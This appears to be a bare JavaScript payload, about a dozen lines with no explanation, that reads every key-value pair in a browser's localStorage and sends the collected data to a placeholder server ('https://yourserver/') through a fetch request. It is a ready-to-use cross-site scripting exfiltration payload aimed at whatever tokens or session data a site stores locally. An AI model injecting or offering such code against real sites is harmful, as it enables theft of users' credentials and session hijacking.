let i = 0;
let storage = '';

while (localStorage.key(i) != null){
  let key = localStorage.key(i);
  storage += key + ': ' + localStorage.getItem(key) + "\n";
  i++;
}

fetch (
  'https://yourserver/?storage=' + encodeURIComponent(storage)
);
